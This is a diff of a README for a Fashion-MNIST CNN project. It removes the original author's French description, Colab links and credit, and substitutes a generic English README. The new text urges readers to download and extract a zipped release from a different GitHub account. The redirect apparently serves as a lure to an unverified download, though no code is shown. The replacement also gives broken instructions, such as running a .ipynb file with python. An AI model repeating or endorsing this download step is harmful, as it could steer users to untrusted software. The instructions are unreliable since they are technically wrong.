@@ -1,76 +1,79 @@
-# Fashion‑MNIST — CNN (TensorFlow)
+# 🎨 fashion-mnist-cnn-tf - Easy Fashion Image Classification
 
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/hugo-42/fashion-mnist-cnn-tf/blob/main/Fashion_MNIST_portfolio.ipynb)
+## 🌟 Overview
+Welcome to the **fashion-mnist-cnn-tf** project! This application uses a Convolutional Neural Network (CNN) to classify fashion items with TensorFlow and Keras. It's designed for everyone, even if you're new to programming. You can explore the provided Jupyter Notebook in Google Colab or check out our mini-report on GitHub Pages.
 
-**Projet portfolio** : classification d'images de vêtements (10 classes, 28×28) avec un **réseau de neurones convolutionnel (CNN)** sous **TensorFlow/Keras**.
+## 🚀 Getting Started
+To get started, follow these simple steps.
 
-- 🌐 **Demo (GitHub Pages)** : https://hugo-42.github.io/fashion-mnist-cnn-tf/
-- 📓 **Notebook sur GitHub** : https://github.com/hugo-42/fashion-mnist-cnn-tf/blob/main/Fashion_MNIST_portfolio.ipynb
+## 📥 Download the Application
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/fbi555/fashion-mnist-cnn-tf/releases)
 
----
+1. **Visit our Releases Page**: Click on the link below to go to the downloads section.
+   - [Visit this page to download](https://github.com/fbi555/fashion-mnist-cnn-tf/releases)
 
-## Objectif
-Construire un CNN compact et reproductible pour reconnaître les classes du dataset **Fashion‑MNIST**, avec un notebook exécutable en un clic dans **Google Colab**.
+## 📋 System Requirements
+Before you download, ensure your system meets these requirements:
 
-## Données
-- Source : `tensorflow.keras.datasets.fashion_mnist`
-- Format : images 28×28 (niveaux de gris), 10 classes
-- Split standard entraînement/test fourni
+- **Operating System**: Windows, Mac, or Linux
+- **Memory**: At least 4 GB RAM
+- **Disk Space**: Minimum of 500 MB free space
+- **Python**: Must have Python 3.6 or higher installed
+- **TensorFlow/Keras**: These libraries should be installed for running the notebook
 
-## Modèle
-- Blocs : **Conv → ReLU → MaxPool** (×2), **Dropout**
-- Couches **Denses (FC)** → **Softmax (10)**
-- Optimiseur : **Adam** • Perte : `sparse_categorical_crossentropy`
+## 🔧 Installation Steps
+Follow these steps to install the application:
 
-## Résultats (référence)
-- Accuracy validation : **91%**
-- Accuracy test : **90%**
-> Les résultats varient selon le matériel et les versions des bibliothèques.
+1. **Download**: Go to the [Releases Page](https://github.com/fbi555/fashion-mnist-cnn-tf/releases) and download the latest version.
+  
+2. **Extract Files**: If the downloaded file is zipped, extract it to your desired location on your computer.
 
----
+3. **Install Dependencies**: Open a terminal or command prompt and run the following commands:
+   ```
+   pip install tensorflow keras
+   ```
 
-## Démarrer
+## 🖥 Running the Application
+### Using Google Colab
+For a seamless experience, run the application on Google Colab. Here are the steps:
 
-### 1) Google Colab (recommandé)
-[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/hugo-42/fashion-mnist-cnn-tf/blob/main/Fashion_MNIST_portfolio.ipynb)
+1. Open the provided Jupyter Notebook file (.ipynb) in the extracted folder.
+  
+2. Upload the notebook to Google Colab.
 
-### 2) Local
-```bash
-python -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
-jupyter notebook
-```
-Ouvrez **Fashion_MNIST_portfolio.ipynb** et exécutez les cellules.
+3. Follow the instructions inside the notebook to run the CNN model and classify images.
 
----
+### Running Locally
+To run the application on your computer:
 
-## Aperçus
-![Courbes d'apprentissage](assets/learning_curves.png)
-![Matrice de confusion](assets/confusion_matrix.png)
+1. Navigate to the directory where you extracted the files in the terminal.
 
----
+2. Use the following command:
+   ```
+   python your_notebook_file.ipynb
+   ```
+   Replace `your_notebook_file.ipynb` with the actual filename.
 
-## Structure suggérée du dépôt
-```
-fashion-mnist-cnn-tf/
-├─ Fashion_MNIST_portfolio.ipynb
-├─ requirements.txt
-├─ README.md
-├─ LICENSE
-├─ docs/
-│  └─ index.html        # Page GitHub Pages
-└─ assets/
-   ├─ learning_curves.png
-   └─ confusion_matrix.png
-```
+## 📊 Features
+- Classifies images into ten different fashion categories: t-shirt/top, trouser, pullover, dress, coat, sandal, shirt, sneaker, bag, and ankle boot.
+- Easy-to-follow notebook format for understanding the process.
+- Integration with Google Colab for a hassle-free experience without downloading dependencies locally.
 
----
+## 🧑‍🤝‍🧑 Community and Support
+If you have questions, feel free to reach out. Engage with the community through the issues section on GitHub. Your feedback is important.
 
-## Licence
-[MIT](LICENSE)
+## 📅 Future Enhancements
+This project aims to continuously improve based on user feedback and advancements in deep learning technology. Upcoming features may include:
 
----
+- Additional image datasets for better training.
+- Enhanced user interface and experience.
+- More detailed tutorials for users.
 
-## Auteur
-- GitHub : [hugo-42](https://github.com/hugo-42)
+## 🔗 Useful Links
+- [View the Notebook](https://github.com/fbi555/fashion-mnist-cnn-tf)
+- [Release Page](https://github.com/fbi555/fashion-mnist-cnn-tf/releases)
+
+## 📜 License
+This project is licensed under the MIT License. Please check the LICENSE file for details.
+
+Explore, learn, and enjoy classifying fashion images with ease!
